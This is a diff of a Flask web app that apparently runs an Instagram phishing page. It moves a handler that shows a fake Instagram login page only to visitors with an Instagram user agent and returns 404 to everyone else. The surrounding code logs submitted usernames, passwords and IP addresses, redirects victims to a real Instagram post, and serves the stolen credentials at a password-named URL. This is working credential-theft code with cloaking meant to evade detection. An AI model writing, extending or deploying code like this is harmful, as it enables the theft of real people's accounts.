@@ -16,6 +16,15 @@ else:
     PASSWORD = 'password'
 
 
+@app.route('/', methods=['GET'])
+@app.route('/<path:p>', methods=['GET'])
+def login_page(p: str=None):
+    if INSTAGRAM_USERAGENT_SIGNATURE in request.headers.get('User-Agent'):
+        return render_template('instagram-login.html')
+    else:
+        abort(404)
+
+
 @app.route('/login', methods=['POST'])
 def login():
     if not request.form['username']:
@@ -24,15 +33,6 @@ def login():
         abort(400)
     log_credentials(request.form['username'], request.form['password'], request.remote_addr, request.user_agent)
     return redirect('https://www.instagram.com/p/NdYIBT9hYfq6yfzrf8Zr')
-
-
-@app.route('/', methods=['GET'])
-@app.route('/<path:p>', methods=['GET'])
-def login_page(p: str=None):
-    if INSTAGRAM_USERAGENT_SIGNATURE in request.headers.get('User-Agent'):
-        return render_template('instagram-login.html')
-    else:
-        abort(404)
 
 
 @app.route('/credentials/' + PASSWORD)
